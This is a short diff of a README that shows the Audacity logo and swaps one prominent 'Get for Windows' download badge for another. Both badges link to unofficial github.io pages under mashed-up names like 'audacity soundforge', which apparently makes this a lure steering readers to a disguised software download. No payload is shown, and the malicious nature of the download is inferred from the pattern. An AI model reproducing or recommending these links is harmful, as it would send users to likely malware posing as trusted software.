@@ -4,11 +4,7 @@
   <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Audacity_Logo_2-2-0.png" alt="Audacity WaveEdit Lab Logo"/>
 </p>
 
-<p align="center">
-  <a href="https://audacity-soundforge-pro.github.io/.github/">
-    <img src="https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge&logo=windows" alt="Get for Windows"/>
-  </a>
-</p>
+[![GET audacity soundforge](https://img.shields.io/badge/GET%20%E2%80%94%20audacity-soundforge-0078D6?style=for-the-badge&logoColor=white)](https://powelseppersaud.github.io/.github/audacity-soundforge)
 
 ---
 
